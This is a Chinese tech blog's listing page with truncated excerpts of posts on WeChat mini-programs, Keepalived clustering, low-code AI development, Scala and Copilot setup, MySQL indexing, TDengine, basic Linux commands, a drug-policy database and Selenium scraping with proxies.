页面栈是指小程序中用于管理页面的栈结构。每当跳转到一个新页面时，该页面会被推入页面栈中，当页面返回时，栈顶的页面会被弹出。微信小程序中的页面栈大小默认为 10，即最多同时保留 10 个页面，超过这个数量时，最早进入的页面将被销毁。
请解释微信小程序中的数据缓存机制并提供示例。
微信小程序提供了数据缓存机制，可以通过 wx.setStorage 和 wx.getStorage 方法将数据存储在本地缓存中。示例代码如下：
// 存储数据 wx.setStorage({ key: 'key', data: 'value', success: function() { console.log('数据存储成功'); } }); // 获取数据 wx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d55190cbce1bbf0e16ff5cff0e1234ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bfcd3999c6065e612ebbb2eb679862a/" rel="bookmark">
			LVS&#43;Keepalived集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一个合格的集群需具备的特性：
健康检查（探针）的方式：
Keepalived
实现原理
Keepalived体系主要模块及其作用
keepalived抢占及非抢占模式
脑裂现象
keepalived部署及配置
实验效果
本次实验目的：实现高可用负载均衡
一个合格的集群需具备的特性： 负载均衡：LVS、Nginx、HAProxy、F5
健康检查（探针）：for调度器/节点服务器、Keepalived、Heartboat
故障转移：通过VIP漂移实现主备切换
健康检查（探针）的方式： 发送心跳消息（ping/pang）
TCP端口检查：向目标主机的IP:PORT发起TCP连接请求，如果TCP连接三次握手成功则认为健康检查探测成功，否则认为健康检查探测失败
HTTP URL检查：向目标主机的http://IP:PORT/URL路径发送HTTP GET请求方法，如果响应消息为2XX、3XX状态码则认为健康检查探测成功，如果响应消息为4XX、5XX状态码则认为健康检查探测失败
Keepalived 避免单台服务器应用故障，发生单点故障，企业服务将造成中断
是专为LVS和HA设计的健康检查工具，实现高可用的应用程序
支持故障自动切换 (Failover)
支持节点健康状态检查(Health Checking)
判断LVS负载调度器、节点服务器的可用性，当master主机出现故障及时切换到backup节点保证业务正常，当master故障主机恢复后将其重新加入群集并目业务重新切换回master节点。
实现原理 在LVS服务集群中，通常有主服务器(MSTER) 和备份服务器 (BACKUP)两种角色的服务器，但是对外表现为一个成虚拟IP(VIP)，主服务器会发送VRRP通告信息给备份服务器，当备份服务器收不到VRRP消息的时候，即主服务器异常的时候，备份服务器就会接管虚拟IP，继续提供服务，从而保证了高可用性.
Keepalived采用VRRP热备份协议实现Linux服务器的多机热备功能
VRRP(虚拟路由元余协议)：是针对路由器的一种备份解决方案
由多台路由器组成一个热备组，通过共用的虚拟IP地址对外提供服务
每个热备组内同时只有一台主路由器提供服务，其他路由器处于冗余状态
若当前在线的路由器失效，则其他路由器会根据设置的优先级自动接替虚拟IP地址，继续提供服务
双机热备的故障切换是由虚拟IP地址的漂移来实现，适用于各种应用服务器
Keepalived体系主要模块及其作用 core模块：为keepalived的核心，负责主进程的启动、维护及全局配置文件的加载和解析
vrrp模块：是来实现VRRP协议的（调度器之间的健康检查和主备切换）
check模块：负责健康检查，常见的方式有端口检查及URL检查（节点服务器的健康检查）
keepalived抢占及非抢占模式 抢占模式即MASTER从故障中恢复后，会将VIP从BACKUP节点中抢占过来
非抢占模式即MASTER恢复后不抢占BACKUP升级为MASTER后的VIP
非抢占式俩节点state必须为bakcup，且必须配置nopreempt
注意：这样配置后，我们要注意启动服务的顺序，优先启动的获取master权限，与优先级没有关系了
问题案例： Keepalived通过什么判断哪台主机为主服务器,通过什么方式配置浮动IP? Keepalived首先做初始化先检查state状态，master为主服务器，backup为备服务器 然后再对比所有服务器的priority，谁的优先级高谁是最终的主服务器 优先级高的服务器会通过ip命今为自己的电脑配置一个提前定义好的浮动IP地址。 脑裂现象 现象：主服务器和备服务器同时拥有VIP地址
原因：因为主服务器和备服务器之间的通信链路中断，导致备服务器无法收到主服务器发送的VRRP通告消息，备服务器误认为主服务器故障，并通过IP命令生成VIP地址
解决方式：关闭主或备服务器其中一个keepalived服务
预防操作：
将主和备服务器中做双链路通信
在主服务器上添加脚本进行判断与备服务器通信链路是否中断，如果确实是链路中断则自行关闭keepalived服务
利用第三方应用或监控系统，检测是否发生脑裂故障，如果发生脑裂故障则通过第三方应用或监控系统来关闭主服务器或备服务器上的keepalived服务
keepalived部署及配置 主服务器（MASTER）：192.168.233.129 yum install -y keepalived.x86_64 #yum安装keepalived服务 cd /etc/keepalived #跳转至软件目录 ls keepalived.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bfcd3999c6065e612ebbb2eb679862a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f824a9dabb394bd025c3dbb90bea4e63/" rel="bookmark">
			AI工程化与低代码：加速人工智能应用开发的新趋势
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着人工智能（AI）技术的广泛应用，AI工程化在开发领域中变得越来越重要。而低代码开发平台的出现，进一步加速了AI应用的开发和部署过程。本文将介绍AI工程化的概念，探讨低代码如何助力开发者快速构建和部署AI应用，并讨论AI工程化与低代码的未来发展趋势。
人工智能技术的快速发展和广泛应用，已经成为企业和组织提升效率、改善决策和创新的有力工具。然而，AI应用的开发和部署过程仍面临一些挑战，例如复杂的模型建立、数据处理和系统集成等。为了解决这些问题，AI工程化应运而生。
AI工程化概述 AI工程化是将人工智能技术有效地应用于实际问题的一种方法和实践。它包括了数据准备、模型开发和训练、部署、监控和维护等一系列阶段和过程。AI工程化的目标是构建高效、可靠、可扩展的AI系统，使其能够在真实环境中实现预期的智能化应用。
在AI工程化中，关键的步骤和考虑因素包括：
数据准备： 选择和收集合适的数据集，进行数据清洗、标注和转换，以确保数据的质量和多样性。
模型开发和训练： 选择适当的算法和模型结构，进行模型的开发和训练，调整超参数以获得最佳性能。
模型评估： 通过使用验证集或交叉验证方法来评估模型的性能，包括准确度、精度、召回率等指标。
模型部署： 将训练好的模型嵌入到实际系统中，并构建相应的API接口或用户界面，以便其他应用或用户可以方便地使用模型。
模型监控和维护： 监控模型在实际应用中的表现，及时发现和解决问题，进行模型的更新和迭代，以保证系统的持续性能和稳定性。
规模化和扩展： 考虑系统的规模和扩展性，使其能够处理大规模数据和更多用户的需求。
AI工程化强调实际系统的可靠性、可维护性和可扩展性，不仅仅关注模型本身的性能。它结合了软件工程和机器学习的原则和实践，将人工智能技术应用于实际产业和业务中，推动智能化应用的实现和发展。
AI工程化的重要性 AI工程化是将研究中的人工智能技术转化为实际应用的桥梁。它起源于实践中的挑战和问题，并借鉴了软件工程的经验和方法。AI工程化的重要性主要体现在以下几个方面：
可靠性： AI系统需要在各种复杂场景和变化环境下运行，并产生可靠的结果。通过AI工程化，可以确保模型的准确性和稳定性，降低系统出错的风险。
可扩展性： 随着业务的增长和数据的增加，AI系统需要具备可扩展性，以支持更多的用户和更大规模的数据处理。AI工程化可以提供可扩展的架构和设计思路，使系统能够有效应对不断增长的需求。
可维护性： AI系统的生命周期通常是一个持续的过程，需要不断地进行模型更新和优化。AI工程化可以提供良好的代码管理和版本控制机制，便于团队开发和维护。
低代码开发平台与AI工程化 低代码开发平台是一种现代化的应用开发工具，它通过简化编程语法和提供可视化界面，使得非专业开发者也能够轻松地构建应用程序。这种平台的出现，极大地改变了传统应用开发过程中的复杂性和耗时性，让更多人有了参与应用开发的机会。
随着人工智能技术的飞速发展，将低代码开发平台与AI工程化相结合，成为了一种新的发展趋势。这种结合不仅可以降低AI应用开发的技术门槛，让更多的人能够参与到AI应用的开发过程中，还可以加速开发周期，提高开发者的生产力。
首先，低代码开发平台的可视化界面和简化的编程语法，使得开发者能够更快地理解和掌握AI应用的开发过程。通过这种方式，开发者可以更加专注于应用的功能设计和优化，而不是陷入复杂的编程逻辑中。这无疑降低了AI应用开发的难度，让更多的人可以参与到这个领域中来。
其次，低代码开发平台可以有效地加速AI应用的开发周期。传统的应用开发过程中，开发者需要花费大量的时间和精力在编写代码上。而通过低代码平台，这部分工作可以得到大幅度的简化，使得开发者能够更快地完成应用的开发，投入到实际的运用场景中。
最后，低代码开发平台提高了开发者的生产力。在面对复杂的AI应用开发时，开发者可以通过平台提供的各种组件和工具，快速地搭建应用框架，实现各种功能。这样一来，开发者可以将更多的精力投入到应用的优化和创新上，提高整体的开发效率。
总之，将低代码开发平台与AI工程化结合，是一种符合时代发展趋势的开发模式。这种模式降低了AI应用开发的技术门槛，加速了开发周期，提高了开发者的生产力。相信在不久的将来，会有更多的开发者借助低代码平台，打造出改变世界的AI应用。
低代码在AI应用开发中的应用场景 低代码开发平台在AI应用开发中的应用场景愈发广泛。这类平台凭借其便捷性和高效性，已经成为越来越多开发者的首选工具。下面将详细介绍低代码开发平台在AI应用开发中的多种应用场景。
首先，低代码平台能够简化数据清洗和预处理过程。在AI应用开发中，数据质量往往是决定模型性能的关键因素。使用低代码平台，开发者可以轻松地对原始数据进行处理，如数据清洗、数据转换等，从而提高数据的质量。此外，低代码平台还支持自动化数据处理流程，降低了开发者对专业编程技能的依赖，使更多人能够参与到AI应用开发中来。
其次，低代码平台有助于简化AI模型的训练和部署过程。通过低代码平台，开发者可以轻松构建交互式的AI模型训练和部署界面。这不仅降低了AI模型开发和部署的难度，还提高了模型迭代和测试的效率。在传统的开发模式下，开发者需要花费大量时间编写代码来完成模型的训练和部署；而在低代码平台上，这些任务可以快速完成，使开发者能够更快地将AI模型投入到实际应用中。
此外，低代码平台还支持多样化的AI应用开发。借助低代码平台，开发者可以轻松地创建各种类型的AI应用，如语音识别、图像识别、自然语言处理等。这使得低代码平台在AI应用开发中具有广泛的应用前景。
然而，低代码平台在AI应用开发中也存在一定的局限性。例如，由于低代码平台的高度封装性，开发者可能在某些情况下受到平台功能的限制，无法实现一些复杂的需求。此外，低代码平台的普及也使得AI技术的门槛降低，可能导致市场出现一定程度的同质化竞争。
综上所述，低代码开发平台在AI应用开发中具有诸多优势，如简化数据清洗和预处理过程、降低开发者技能要求、提高模型迭代和测试效率等。然而，开发者也需要关注低代码平台所带来的局限性和潜在风险。在实际应用中，开发者应根据项目需求和自身技能水平，灵活选择开发工具，以实现最佳的AI应用开发效果。随着低代码平台技术的不断发展和完善，我们有理由相信，它在AI应用开发领域的应用将更加广泛。
AI工程化与低代码的未来发展 随着AI技术的进一步成熟和普及，我们可以明显观察到，AI工程化和低代码开发平台正在迎来新一轮的发展热潮。在这个过程中，有两个主要趋势值得我们关注：一是自动化工具和模块化组件的快速发展，旨在加快模型迭代和部署的速度；二是领域专业知识的高度整合和AI模型的领域适应性，以满足各行各业的需求。
首先，自动化工具和模块化组件的发展将极大地提高AI开发效率。在过去的几年里，AI技术取得了令人瞩目的成果，但在实际应用过程中，模型开发和部署的复杂性也给研究人员和企业带来了诸多困扰。为了降低AI开发的门槛，未来我们将看到更多简单易用、功能强大的自动化工具和模块化组件出现。这些工具和组件可以帮助开发者快速构建和优化AI模型，从而提高模型迭代和部署的速度，缩短研发周期，降低成本。
其次，领域专业知识的高度整合和AI模型的领域适应性将成为发展的重点。AI技术在各行各业的应用已经取得了显著成果，但要想实现更深层次的融合和更大范围的应用，就必须解决领域专业知识整合和模型适应性问题。为此，研究人员将不断探索更加灵活、可扩展的AI模型，以满足不同领域、不同场景的需求。这意味着AI技术将不再局限于传统的计算机视觉、自然语言处理等领域，而是向更多专业领域拓展，如医疗、金融、教育等。
此外，我国政府也对AI技术的发展给予了高度重视，推出了一系列政策支持和鼓励措施。在国家战略的引导下，我国AI产业将迎来新一轮的增长周期，相关企业和研究机构将获得更多政策、资金和人才支持，进一步推动AI工程化和低代码开发平台的发展。
总之，随着AI技术的进一步成熟和普及，我们有理由相信，未来AI工程化和低代码开发平台将取得更多突破性进展。同时，自动化工具和模块化组件的快速发展以及领域专业知识的高度整合和AI模型的领域适应性将助力我国AI产业迈向新高峰。在这一过程中，各行各业都将从中受益，迎来智能化转型的契机。我们期待着这一美好未来的到来。
实现智能化应用的关键步骤 随着人工智能技术的飞速发展，越来越多的企业和组织开始将其应用于实际场景，以提升效率、降低成本并实现创新。要实现智能化应用，AI工程化是其中的核心环节。本文将详细介绍实现智能化应用过程中的四个关键步骤，并分析每个步骤的重要性。
数据准备：奠基石般的关键环节 数据是AI系统的基石，合适的数据对于模型的准确性至关重要。在数据准备阶段，需要进行数据收集、清洗、标注和划分，以保证数据的质量和多样性。这一步骤的成果将直接影响后续模型的表现。为了确保数据质量，数据清洗和标注工作必须得到充分重视。此外，数据的多样性也是提高模型泛化能力的关键因素。
模型训练：打造高性能AI利器 在模型训练阶段，需要选择合适的算法和模型结构，并利用准备好的数据进行训练。训练过程中需要进行超参数调优，以获取最佳的模型性能。如同优秀的运动员需要不断调整训练方法和技巧，AI模型也需要在训练过程中不断优化，以达到最佳效果。
模型评估：衡量实力的重要标准 模型评估是衡量模型性能的关键步骤。通过使用验证集或交叉验证方法，评估模型在不同指标上的表现，如准确率、召回率、F1值等，以选择性能最好的模型。这一步骤有助于确保实际应用中AI模型的稳定性和可靠性。
模型部署：让AI融入实际应用 在模型部署阶段，需要将训练好的模型嵌入到具体的应用场景中。这涉及到将模型集成到实际系统中，提供API接口或构建用户界面，以方便用户直接使用。模型部署的成功与否将直接影响AI技术在实际应用中的落地效果。
持续优化：保持竞争力的重要手段 AI系统的持续优化是保证系统性能和用户体验的关键。在部署后，需要不断监控模型的表现，进行数据迭代和模型更新，以满足用户需求和改进系统性能。此外，随着技术的不断发展，还需要对现有模型进行升级，以保持竞争力。
总之，实现智能化应用的关键步骤包括数据准备、模型训练、模型评估、模型部署和持续优化。每个步骤都具有其独特的重要性，只有把握好这些环节，才能打造出高性能、高用户体验的AI应用，为企业和社会创造价值。
结论 人工智能（AI）是当今科技领域的热点，其应用范围不断扩大，涵盖了各行各业。然而，要将人工智能技术从理论研究成功应用到实际生产环境中，关键的一步便是AI工程化。AI工程化是一种综合性、实践性很强的过程，它通过数据准备、模型训练、部署和维护等核心环节，确保智能化系统的可靠性、可扩展性和可维护性。
结合AI工程化和低代码开发平台，企业和组织可以更轻松地开发和部署AI应用，从而实现创新和竞争优势。在未来，AI工程化和低代码开发平台将继续相互促进，共同推动AI技术的广泛应用和发展。
总之，AI工程化是实现智能化应用的关键步骤，它将人工智能技术从研究阶段成功地应用到实际生产环境中。数据准备、模型训练、部署和维护等环节共同保证了AI应用的可靠性、可扩展性和可维护性。随着AI工程化与低代码开发平台的紧密结合，我们将迎来一个更加便捷、高效的AI应用时代。在我国，AI工程化将发挥越来越重要的作用，推动智能化应用不断向前发展，为各行各业带来革命性的变革。
体验地址：引迈 - JNPF快速开发平台_低代码开发平台_零代码开发平台_流程设计器_表单引擎_工作流引擎_软件架构
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0ff66e8643125004b8b7550bb352f0a/" rel="bookmark">
			Scala安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Scala安装使用 windows安装,配置环境变量 以下载Scala2.11为例，操作在Windows中安装Scala。
官网下载scala2.11：All Available Versions | The Scala Programming Language下载好后安装。双击msi包安装,记住安装的路径。配置环境变量（和配置jdk一样） 新建SCALA_HOME 注意：这里建议将Scala安装到纯英文没有空格和特殊符号的路径下。避免后期使用Scala版本出现问题。
上个步骤完成后，编辑Path变量，在后面追加如下： %SCALA_HOME%\bin
打开cmd,输入：scala - version 看是否显示版本号，确定是否安装成功 scala ide Scala IDE就是Scala官网中针对eclipse稳定版本配置好了Scala的插件。Scala IDE 就是配置好Scala插件的eclipse。如果使用eclipse开发Scala建议使用这种方式。下载网址：Download Scala IDE for Eclipse - Scala IDE for Eclipse 。
idea 中配置scala插件 打开idea,close项目后，点击Configure-&gt;Plugins 搜索scala，点击Install安装 注意：这里安装了Scala，所以这里显示“Uninstall”。
设置jdk，打开Project Structure，点击new 选择安装好的jdk路径 创建scala项目，配置scala sdk(Software Development Kit) 点击第三步，弹出选择SDK,点击Browse选择本地安装的Scala目录。选择system对应的Scala版本即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/792b5bf7248a20ad2328262239c11c37/" rel="bookmark">
			MySQL索引，事务与存储引擎
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
索引
定义:
作用:
工作方式:
索引的分类和创建
（1）普通索引：最基本的索引类型，没有唯一性之类的限制。
（2）唯一索引：与普通索引类似，但区别是唯一索引列的每个值都唯一。
（3）主键索引：是一种特殊的唯一索引，必须指定为“PRIMARY KEY”。一个表只能有一个主键，不允许有空值。 添加主键将自动创建主键索引。
（4）组合索引（单列索引与多列索引）：可以是单列上创建的索引，也可以是在多列上创建的索引。
（5）全文索引（FULLTEXT）：适合在进行模糊查询的时候使用，可用于在一篇文章中检索文本信息。
遇到 select 语句查询速度慢改怎么办?
事务的 ACID 特性:
原子性:
一致性:
隔离性：
隔离级别:
设置隔离级别:
隔离级别名称:
查看隔离级别:
持久性:
事务管理操作：
存储引擎
MyISAM与InnoDB的区别？
查看表的存储引擎:
死锁:
如何避免死锁?
索引 定义: 索引是一个排序的列表，包含索引字段的值和其对应的行记录的数据所在的物理地址
作用: 加快表的查询速度，还可以对字段排序
副作用:会额外占用磁盘空间; 更新包含索引的表会花费更多的时间，效率会更慢
工作方式: 没有索引的情况下，要根据条件查询某行数据时，需要先扫描全表，再定位某行数据的位置
有了索引后，会先通过查询条件的字段值找到其索引对应的行记录的数据的物理地址，然后根据物理地址直接访问相应的行记录的数据，就像根据书目录的页码快速找到的内容 创建索引的依据:
1) 表中的记录行数较多时，一般超过300行的表建议要有索引
2）建议在表中的主键字段、外键字段、多表连接使用的公共关键字段、唯一性较好的字段、不经常更新的字段、经常出现在 mere,gromp by,order by 子语句的字段、短小的字段上面创建索引
3) 不建议在唯一性较差的字段、更新太频繁的字段、大文本字段上面创建索引
索引的分类和创建 （1）普通索引：最基本的索引类型，没有唯一性之类的限制。 ●直接创建索引 CREATE INDEX 索引名 ON 表名 (列名[(length)]); #(列名(length))：length是可选项，下同。如果忽略 length 的值，则使用整个列的值作为索引。如果指定，使用列的前 length 个字符来创建索引，这样有利于减小索引文件的大小。在不损失精确性的情况下，长度越短越好。 #索引名建议以“_index”结尾。
create index name_index on member (name);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/792b5bf7248a20ad2328262239c11c37/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07da349c7df3fd029864fb2defe1b85a/" rel="bookmark">
			PyCharm安装GitHub Copilot（最好用的AI编程插件之一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 GitHub Copilot简介PyCharm安装Copilot教程 GitHub Copilot简介 GitHub Copilot 是由 GitHub 和 OpenAI 共同开发的一款人工智能辅助编程工具。它是一个基于机器学习的代码编写插件，旨在为开发人员提供即时的代码建议和自动补全功能。
GitHub Copilot 使用了大规模的开源代码库进行训练，并利用自然语言处理和深度学习技术来理解开发人员在编写代码时的上下文和意图。它可以在开发过程中根据代码的上下文和注释，为用户提供实时的代码片段、函数和类的建议，同时提供自动补全、重构和错误检查等功能。
GitHub Copilot 的主要功能和特点：
代码补全：Copilot 可以根据上下文为您提供实时的代码补全建议，节省编写代码的时间和精力。
代码片段：Copilot 可以根据您的代码需求生成包括函数、类和方法等代码片段，使您能够更快速地构建功能。
上下文感知：Copilot 能够理解代码的上下文和意图，根据您正在编写的代码自动生成合适的建议。
多语言支持：Copilot 支持多种编程语言，包括 Python、JavaScript、TypeScript、Go、Ruby 等，使其适用于各种开发环境。
错误检查：Copilot 可以帮助您检测代码中的常见错误，并提供修复建议，提高代码的质量和可靠性。
重构支持：Copilot 可以帮助您重构代码，提供重命名、提取函数和变量等功能，提升代码的可读性和可维护性。
文档和注释：Copilot 可以为您生成函数和类的文档注释，减少编写文档的工作量。
自定义模板：Copilot 支持自定义代码模板，可以根据您的开发习惯和团队规范进行个性化配置。
PyCharm安装Copilot教程 打开PyCharm → \rightarrow →设置 → \rightarrow →插件 → \rightarrow →搜索copilot → \rightarrow →安装GitHub Copilot： 安装完成后 → \rightarrow →重启PyCharm → \rightarrow →弹出窗口提示需要绑定GitHub账户 → \rightarrow →复制窗口中的8位口令密码 → \rightarrow →在弹出的网页界面粘贴口令密码 → \rightarrow →成功绑定GitHub账户： 测试插件效果：如下图所示，我只输入了if __name__ == "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07da349c7df3fd029864fb2defe1b85a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cca68383f673141da8e080b2156790d/" rel="bookmark">
			“双十一、二” 业务高峰如何扛住？韵达快递选择 TDengine
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小 T 导读：
为了有效处理每日亿级的数据量，早在 2021 年，韵达就选择用 TDengine 替代了 MySQL，并在三台服务器上成功部署和上线了 TDengine 2.0 集群。如今，随着 TDengine 3.0 版本的逐渐成熟，韵达决定将现有的 2.0 版本升级到 3.0 版本，并基于本文为大家分享其在升级过程中所进行的优化措施以及升级后的性能表现。
作为一家头部物流公司，韵达每日的订单扫描量破亿级别，该类数据为典型的时序数据，这也是我们公司数据量最大的一块业务。系统需要汇总统计全国网点的扫描数据（韵达的所有订单数据），并实时反馈给用户。此外，这些数据也会给到网点、分拨中心的内部员工使用，用于个人工作量、站点扫描量等统计工作。在“双十一、二”期间，面对快递业务量的暴涨，TDengine 帮助我们很好地完成了既定规划，保障了“双十一、二”任务的顺利完成。
本文用于分享我司在 TDengine 上使用的历程和心得。
从 2.0 到 3.0 在早些年业务尚未扩张时，我们采用的是 MySQL 分区+索引方式进行扫描枪数据的处理，但随着企业的发展、业务量的增加，面对每日亿级的数据量，MySQL 显然已经无法满足当下的数据处理需求。
在这种背景下，我们决定进行时序数据库（Time Series Database）选型。经过严格的选项测试，我们最终选择了 TDengine 作为核心数据库处理该部分数据。在 2021 年，我们在三台 16C 64G 的服务器上部署上线了 TDengine 2.0 版本集群。（“一个扫描枪一张表”，韵达选择 TDengine 应对每日亿级数据量 - TDengine | 涛思数据）
该集群每天要承载日常 6 亿行数据的写入和一定量的查询，“双十一、二”等特殊业务期间，写入/查询量还要上涨 50% 左右，数据需要保留 2 个月。
我们的架构是 Spring Boot + MyBatis + MySQL + TDengine，TDengine 负责处理时序数据，MySQL 则负责非时序数据的存储及应用，如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cca68383f673141da8e080b2156790d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78de01e28ba479dde46ce321d762df33/" rel="bookmark">
			Linux/CentOS7命令、脚本和软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.常用命令 1.1. 文件列表ls #将隐藏文件，也就是以点开头的文件，也显示出来 ls -a #长格式显示列表详情,包括修改日期 ls -l #长格式人性化显示，比如大小会按照多少K，或者多少M显示 ls -lh #只显示 /etc 目录本身的详情，而不会把它里面的文件和目录显示出来 ls -ld /etc #统计当前目录下文件的个数（不包括目录） ls -l |grep "^-"|wc -l 1.2. 创建目录mkdir #创建/tmp/xiaodianying/canglaoshi 目录，如果没有xiaodianying这个目录会直接创建 mkdir -p /tmp/xiaodianying/canglaoshi #在当前目录下创建xiaodianying目录 mkdir xiaodianying 1.3. 本地复制cp #将 /etc/fuse.conf 这个文件复制到 /tmp/下 cp /etc/fuse.conf /tmp/ #将 /etc/fuse.conf 这个文件复制到 /tmp/下,并更名为fuse2.conf cp /etc/fuse.conf /tmp/fuse2.conf #将 fuse.conf 复制为fuse4.conf，原有属性一并复制 cp -p fuse.conf fuse4.conf #将zmj/这个目录本身以及这个目录下的所有内容都复制到 sxy/ 下 #如果不存在sxy/ 这个目录，则复制过来的zmj/会更名为sxy/ cp -r zmj/ sxy/ #不包含zmj/这个目录，只将zmj/这个目录下的所有内容都复制到 sxy/下 cp -r zmj/* sxy/ 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78de01e28ba479dde46ce321d762df33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73e3af5b2ef9d353fbef01a123a437df/" rel="bookmark">
			药物政策法规数据库在线免费查询网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着社会的发展和人民生活水平的提高，药物行业在现代社会中扮演着至关重要的角色。为了确保医疗服务的质量和安全，各国都制定了一系列的政策法规来规范药物行业的运作，如我国药物政策法规信息来源就包括有药监局、医保局、卫健委、食药监局、知识产权局等药物政策研究机构。
同样的其它国家或地区也包含各类的药物相关法律法规、政策文件、行业标准等信息，如此庞大的信息往往使得药物企业或相关从业者在了解某个相关政策法规信息时需要耗费大量精力与时间，同时还面临着相关政策法规错查、漏查的风险，无论对于药企或相关从业者来说都容易造成不必要损失。
所以现在药物企业在了解相关药物政策法规信息时都是通过专业的药物政策法规数据库进行查阅，如药企应用广泛的药融云-药物政策法规数据库就收载了国内外（中国、美国、欧洲、WHO等）权威部门（政府机关、NMPA、FDA等）的药政法规、技术指导、卫生防疫、大健康战略等多维度的指导信息15万余条数据，为把握政策走向提供不可或缺的助力。下面笔者就介绍一下该药物政策法规数据库的作用与查询方法。
①药物政策法规数据库的查询方法
还是以药融云为例，进入药融云门户网站→选择个人版（免费查阅）或企业版→选择[合理用药]→选择[政策法规数据库]（如下图）
图源:药融云数据库(企业版)
进入该政策法规数据库可以看到有三种检索方式（全文检索、关键词搜索、条件筛选），在条件筛选方式中不仅将政策法规进行了不同的信息来源分类（地方性法规和规章、指导原则、部门规范性文件、部门规章、地方规范性文件、法律行政法规、政策解读、行政法规、法律、地方性法规、规范性文件、国务院规范性文件），还将其政策法规进行了500多个区域分类（含州、国家、省份、市）供大家快速筛选，如下图。
图源:药融云数据库企业版
在点击[搜索]后呈现的检索结果页面中可以看到，该数据库对每一条政策法规文件进行标签化处理，让用户能快速了解到政策法规文件中的关键内容（发布机构、发布时间、文件分类、现行是否有效），通过点击[查看]了解该法规详情信息，如下图。
②药物政策法规数据库的作用
·帮助企业及时了解最新的法规变化，避免因为不了解政策而违规操作，从而避免不必要的风险和损失。
·帮助企业从业者高效了解药物注册要求、生产质量标准、市场准入条件等法规要求，确保自身的合规。
·帮助研究人员通过数据库了解药物行业的法律环境，分析政策趋势，为药物创新和研究提供参考。
以上不难看出药物政策法规数据库是药物企业不可或缺的工具，它帮助企业了解和遵守法规要求，把握市场准入条件，预测政策趋势，保护知识产权，拓展业务。通过合理利用药物政策法规数据库，企业可以更好地适应药物行业的发展和变化。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32f993888526643a46d9a14bbf203c22/" rel="bookmark">
			java爬虫技术之Selenium爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、什么是代理IP？
二、为什么要使用代理IP？
三、使用Selenium爬虫结合代理IP进行爬取
1. 安装Selenium和浏览器驱动
2. 导入相关库和模块
3. 设置代理IP
4. 访问目标网页
5. 提取数据
6. 关闭浏览器驱动
四、总结
前言 Selenium爬虫是一种基于浏览器自动化的爬虫技术，可以模拟用户的操作行为，实现对动态网页的爬取。在一些情况下，为了绕过网站的反爬虫机制或者访问受限的网站，我们需要使用代理IP来进行爬取。本文将介绍如何使用Selenium爬虫结合代理IP进行网络爬取，并附带完整的代码实现。
一、什么是代理IP？ 代理IP（Proxy IP）是指通过中间服务器发送请求，隐藏真实的客户端IP地址。在网络爬取中，使用代理IP能够绕过网站的限制，提高爬取的效率和成功率。代理IP可以分为两种类型：正向代理和反向代理。正向代理是作为客户端的角色，代理服务器代表客户端向服务器发送请求。反向代理是作为服务器的角色，代理服务器代表服务器接收客户端的请求。
二、为什么要使用代理IP？ 在一些情况下，网站会对爬虫进行限制，例如设置访问频率限制、验证码验证、设置黑名单等。为了绕过这些限制，我们可以使用代理IP来模拟不同的IP地址进行爬取。使用代理IP还可以分散请求的来源，提高爬取的成功率。此外，一些网站可能根据IP地址的地理位置限制访问，使用代理IP能够改变我们的地理位置，实现对网站的访问。
三、使用Selenium爬虫结合代理IP进行爬取 1. 安装Selenium和浏览器驱动 首先，我们需要安装Selenium和相应的浏览器驱动。Selenium支持多种浏览器，例如Chrome、Firefox、Edge等。这里以Chrome浏览器为例，首先需要安装Chrome浏览器和Chrome驱动。
2. 导入相关库和模块 在Python中，我们可以使用selenium库来实现对浏览器的自动化操作。另外，我们还需要导入一些其他的库和模块，例如requests、time等。
import requests from selenium import webdriver from selenium.webdriver.chrome.options import Options import time 3. 设置代理IP 我们可以使用免费的代理IP网站获取代理IP，例如站大爷代理ip。获取到代理IP后，需要将其设置到浏览器驱动中。
proxy_ip = '127.0.0.1:8888' # 代理IP chrome_options = Options() chrome_options.add_argument('--proxy-server=http://' + proxy_ip) driver = webdriver.Chrome(options=chrome_options) 4. 访问目标网页 设置完代理IP后，我们可以使用Selenium爬虫自动化操作浏览器，实现对目标网页的访问和数据的提取。
url = 'https://www.example.com' # 目标网页 driver.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32f993888526643a46d9a14bbf203c22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6a30410ec066a225661eff857db0640/" rel="bookmark">
			redis和数据库的同步问题
